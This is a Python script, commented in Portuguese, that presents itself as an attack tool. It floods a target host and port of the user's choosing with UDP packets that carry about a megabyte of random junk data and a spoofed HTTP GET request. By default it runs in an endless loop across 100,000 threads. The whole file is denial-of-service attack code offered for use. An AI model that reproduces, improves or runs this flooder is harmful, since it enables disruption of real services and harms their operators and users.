import sys
import os
import time
import socket
import random
import argparse
import threading

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

def generate_junk_data(size_mb):
    """Gera junk data com o tamanho especificado em megabytes."""
    return os.urandom(size_mb * 1024 * 1024)

def get_user_agents():
    User_Agents = []
    try:
        with open("user-agents.txt", "r") as agents:
            for line in agents:
                User_Agents.append(line.strip())  # Adiciona cada user agent ao array
    except FileNotFoundError:
        print("Arquivo de User Agents não encontrado.")
    return User_Agents

def send_packet(host, port, payload):
    try:
        sock.sendto(payload, (host, port))
        print(f"Enviando pacote para {host}:{port}")
    except Exception as e:
        print(f"Erro ao enviar pacote: {e}")

def get_arguments():
    parser = argparse.ArgumentParser(description="Argumentos utilizados para informar o host que deseja realizar o ataque")
    parser.add_argument('--url', type=str, required=True, help='Digite a URL que deseja realizar o ataque Ex: teste.com')
    parser.add_argument('--port', type=int, default=80, help='Porta do servidor alvo (padrão: 80)')
    parser.add_argument('--threads', type=int, default=100000, help='Número de threads (padrão: 10)')
    parser.add_argument('--size_mb', type=int, default=1, help='Tamanho do payload em megabytes (padrão: 1MB)')
    args = parser.parse_args()

    return args

def attack(url, port, size_mb, thread_id):
    user_agents = get_user_agents()
    
    if not user_agents:
        print("Nenhum User Agent disponível.")
        return

    path = "/"
    while True:
        # Gera um request com um user-agent aleatório
        user_agent = random.choice(user_agents)
        request = f"GET {path} HTTP/1.1\r\n" \
                  f"Host: {url}\r\n" \
                  f"User-Agent: {user_agent}\r\n" \
                  f"Connection: close\r\n\r\n"

        # Gera junk data e combina com o request
        junk_data = generate_junk_data(size_mb)
        payload = junk_data + request.encode()

        # Envia o pacote
        send_packet(url, port, payload)

def start_attack_threads(url, port, size_mb, num_threads):
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=attack, args=(url, port, size_mb, i))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()  # Espera as threads terminarem (se quiser execução contínua, pode remover isso)

if __name__ == "__main__":
    args = get_arguments()
    start_attack_threads(args.url, args.port, args.size_mb, args.threads)
